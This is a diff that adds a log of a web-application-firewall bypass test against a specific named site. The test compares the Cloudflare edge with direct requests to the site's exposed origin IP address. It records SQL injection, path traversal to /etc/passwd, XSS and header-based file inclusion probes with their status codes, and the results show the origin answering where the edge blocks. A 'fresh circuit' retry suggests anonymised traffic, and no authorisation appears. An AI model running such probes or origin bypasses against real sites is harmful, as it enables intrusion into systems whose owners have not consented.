@@ -1,0 +1,42 @@
+=== WAF BYPASS TEST — read-only, non-destructive ===
+--- TEST 1: SQLi payload ?id=1' OR '1'='1 ---
+[EDGE painel.concurseiroprime.com.br via Cloudflare]
+HTTP:302 SIZE:418
+[ORIGIN matrix 200.150.200.210 Host: painel.]
+HTTP:200 SIZE:48424
+
+--- TEST 2: path traversal ?file=../../etc/passwd ---
+[EDGE painel via Cloudflare]
+HTTP:302 SIZE:418
+[ORIGIN matrix 200.150.200.210 Host: painel.]
+HTTP:200 SIZE:48454
+
+--- TEST 3: XSS ?q=<script>alert(1)</script> ---
+[EDGE painel via Cloudflare]
+HTTP:302 SIZE:418
+[ORIGIN matrix 200.150.200.210 Host: painel.]
+HTTP:200 SIZE:48544
+
+--- TEST 4: LFI via header X-Forwarded-For: ../../etc/passwd ---
+[EDGE painel via Cloudflare]
+HTTP:302 SIZE:418
+[ORIGIN matrix 200.150.200.210 Host: painel.]
+HTTP:000 SIZE:0
+
+--- TEST 5: baseline benign / (control) ---
+[EDGE painel]
+HTTP:000 SIZE:0
+[ORIGIN matrix Host: painel.]
+HTTP:000 SIZE:0
+[ORIGIN matrix Host: matrix.]
+HTTP:000 SIZE:0
+=== retry baseline ===
+--- TEST 5 retry (fresh circuit) ---
+[EDGE painel benign /]
+HTTP:302 SIZE:418
+[EDGE painel benign /auth/login]
+HTTP:200 SIZE:79432
+[ORIGIN matrix Host: painel. benign /]
+HTTP:200 SIZE:48084
+[ORIGIN matrix Host: painel. /auth]
+HTTP:404 SIZE:0
